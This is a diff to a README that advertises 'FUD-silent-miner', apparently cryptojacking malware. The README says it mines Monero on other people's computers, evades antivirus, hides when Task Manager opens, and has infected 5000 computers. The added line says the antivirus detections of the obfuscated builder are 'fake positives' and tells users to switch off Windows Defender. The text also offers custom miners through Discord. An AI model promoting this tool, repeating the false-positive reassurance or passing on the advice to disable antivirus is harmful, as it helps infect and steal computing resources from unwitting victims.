@@ -1,6 +1,7 @@
 # FUD-silent-miner
 Can only be used to mine XMR using others cpu and gpu. Bypass anti-virus software completely (Fully Undetected). When the user opens the task manager, it will automatically stop mining, and close it to continue. I infected 5000 computers in a week https://github.com/clayzou/FUD-silent-miner/blob/main/miner.png If you want me to help you create your own miner, please contact me by discord. This is my discord: "! ! `FREE TOOLS#5387" (remove the ") 
 
+The builder is obfuscuated and will provide fake positives, I guarantee you that they are fake and to bypass it you just have to turn off Windows Defender.
 
 I, the creator, am not responsible for any actions, and or damages, caused by this software.
 
